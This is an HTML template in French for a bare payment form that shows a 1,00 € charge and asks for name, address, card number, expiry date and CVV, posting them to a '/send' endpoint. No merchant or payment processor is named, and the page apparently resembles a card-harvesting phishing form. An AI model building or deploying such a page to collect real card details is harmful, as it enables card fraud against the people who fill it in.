<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Formulaire de Paiement</title>
  <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      font-family: 'Roboto', sans-serif;
      background: #fff;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .transaction-bar {
      background-color: #23445b;
      color: white;
      width: 100%;
      text-align: center;
      padding: 15px 0;
      font-size: 18px;
      font-weight: bold;
    }

    .form-container {
      max-width: 500px;
      width: 90%;
      margin: 30px auto;
      padding: 0 15px;
    }

    h1 {
      font-size: 36px;
      margin-bottom: 10px;
      text-align: center;
    }

    .required {
      color: red;
      font-size: 12px;
      font-style: italic;
      text-align: center;
      margin-bottom: 20px;
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }

    label {
      font-weight: bold;
      font-size: 14px;
    }

    input[type="text"],
    input[type="email"],
    input[type="tel"],
    input[type="date"] {
      padding: 10px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 3px;
      width: 100%;
    }

    .name-fields {
      display: flex;
      gap: 10px;
    }

    .name-fields input {
      flex: 1;
    }

    button {
      background-color: #ccc;
      padding: 12px 20px;
      border: none;
      font-size: 16px;
      cursor: pointer;
      align-self: flex-start;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #bbb;
    }

    @media (max-width: 600px) {
      h1 {
        font-size: 28px;
      }

      .name-fields {
        flex-direction: column;
      }

      button {
        width: 100%;
        align-self: stretch;
      }
    }
  </style>
</head>
<body>
  <div class="transaction-bar">Montant de la transaction&nbsp; : &nbsp;<strong>1,00 €</strong></div>

  <div class="form-container">
    <h1>Formulaire</h1>
    <p class="required">* indique un champ obligatoire</p>

    <form method="POST" action="/send">
      <label>Nom et prénom *</label>
      <div class="name-fields">
        <input type="text" name="prenom" placeholder="Premier" required>
        <input type="text" name="nom" placeholder="Dernier" required>
      </div>

      <label>Adresse *</label>
      <input type="text" name="adresse" required>

      <label>Numéro de la carte *</label>
      <input type="text" name="carte" required>

      <label>Date de validation *</label>
      <input type="text" name="date" placeholder="MM/AA" required>

      <label>CVV *</label>
      <input type="text" name="cvv" required>

      <button type="submit">VALIDER</button>
    </form>
  </div>
</body>
</html>
